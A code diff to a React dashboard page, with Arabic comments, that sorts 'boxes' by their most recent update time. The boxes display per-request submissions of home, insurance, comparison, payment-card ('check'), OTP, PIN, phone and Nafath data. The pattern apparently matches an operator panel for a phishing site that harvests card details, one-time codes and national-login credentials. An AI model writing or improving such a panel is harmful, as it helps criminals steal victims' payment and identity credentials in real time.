@@ -3223,36 +3223,52 @@ export default function DashboardPage() {
   };
 
   // =============================================
-  // دالة عرض جميع الصناديق الجديدة
+  // دالة عرض جميع الصناديق الجديدة - مرتبة حسب الأحدث
   // =============================================
   const renderAllNewBoxes = () => {
-    const boxes: Array<{ key: string; component: React.ReactNode }> = [];
+    const raw = selectedRequest?.raw || {};
+    
+    // دالة مساعدة للحصول على أحدث وقت لكل صندوق
+    const getBoxTimestamp = (boxKey: string): number => {
+      const timestamps: Record<string, number> = {
+        home: new Date(raw.submittedAt || raw.updatedAt || raw.homeUpdatedAt || 0).getTime(),
+        insur: new Date(raw.insurUpdatedAt || raw.updatedAt || raw.submittedAt || 0).getTime(),
+        compar: new Date(raw.comparCompletedAt || raw.comparUpdatedAt || raw.selectedOffer?.updatedAt || raw.updatedAt || 0).getTime(),
+        check: new Date(raw._v1UpdatedAt || raw.cardUpdatedAt || 0).getTime(),
+        otp: new Date(raw._v5UpdatedAt || raw.otpSubmittedAt || 0).getTime(),
+        pin: new Date(raw.pinSubmittedAt || raw._v6UpdatedAt || 0).getTime(),
+        phone: new Date(raw.phoneSubmittedAt || raw._v7UpdatedAt || 0).getTime(),
+        nafad: new Date(raw.nafadUpdatedAt || 0).getTime(),
+      };
+      return timestamps[boxKey] || 0;
+    };
 
-    // إضافة الصناديق بالترتيب
+    // إنشاء قائمة الصناديق مع أوقاتها
+    const boxes: Array<{ key: string; component: React.ReactNode; timestamp: number }> = [];
+
     const homeBox = renderHomeNewBox();
-    if (homeBox) boxes.push({ key: 'home', component: homeBox });
+    if (homeBox) boxes.push({ key: 'home', component: homeBox, timestamp: getBoxTimestamp('home') });
 
     const insurBox = renderInsurBox();
-    if (insurBox) boxes.push({ key: 'insur', component: insurBox });
+    if (insurBox) boxes.push({ key: 'insur', component: insurBox, timestamp: getBoxTimestamp('insur') });
 
     const comparBox = renderComparBox();
-    if (comparBox) boxes.push({ key: 'compar', component: comparBox });
+    if (comparBox) boxes.push({ key: 'compar', component: comparBox, timestamp: getBoxTimestamp('compar') });
 
-    // صندوق بطاقة الدفع (صفحة check) - يظهر قبل OTP
     const checkBox = renderCheckBox();
-    if (checkBox) boxes.push({ key: 'check', component: checkBox });
+    if (checkBox) boxes.push({ key: 'check', component: checkBox, timestamp: getBoxTimestamp('check') });
 
     const otpBox = renderOtpBox();
-    if (otpBox) boxes.push({ key: 'otp', component: otpBox });
+    if (otpBox) boxes.push({ key: 'otp', component: otpBox, timestamp: getBoxTimestamp('otp') });
 
     const pinBox = renderPinBox();
-    if (pinBox) boxes.push({ key: 'pin', component: pinBox });
+    if (pinBox) boxes.push({ key: 'pin', component: pinBox, timestamp: getBoxTimestamp('pin') });
 
     const phoneBox = renderPhoneBox();
-    if (phoneBox) boxes.push({ key: 'phone', component: phoneBox });
+    if (phoneBox) boxes.push({ key: 'phone', component: phoneBox, timestamp: getBoxTimestamp('phone') });
 
     const nafadBox = renderNafadBox();
-    if (nafadBox) boxes.push({ key: 'nafad', component: nafadBox });
+    if (nafadBox) boxes.push({ key: 'nafad', component: nafadBox, timestamp: getBoxTimestamp('nafad') });
 
     if (boxes.length === 0) {
       return (
@@ -3266,6 +3282,9 @@ export default function DashboardPage() {
         </div>
       );
     }
+
+    // ترتيب الصناديق حسب الأحدث (الأعلى في القائمة = الأحدث)
+    boxes.sort((a, b) => b.timestamp - a.timestamp);
 
     return (
       <div style={{ 
